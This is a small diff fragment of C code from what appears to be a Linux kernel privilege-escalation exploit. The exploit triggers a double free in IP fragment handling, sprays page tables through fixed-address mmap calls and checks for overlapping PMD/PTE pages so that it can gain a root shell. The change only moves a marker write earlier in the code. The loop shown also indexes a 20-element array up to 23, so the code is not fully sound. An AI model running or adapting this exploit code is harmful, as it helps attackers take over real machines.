@@ -346,13 +346,13 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// causes end == offset in ip_frag_queue(). packet will be empty
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
+	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 	void *_pmd_area1[20];
 	for (int i=4; i < 24; i++){
 		_pmd_area1[i] = mmap((void*)PTI_TO_VIRT(1, i, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 		*(unsigned long long*)_pmd_area1[i] = 0xCAFEBABA;
 	}
 	// allocate overlapping PMD page (overlaps with PTE)
-	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 	sleep(2);
 	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);
 
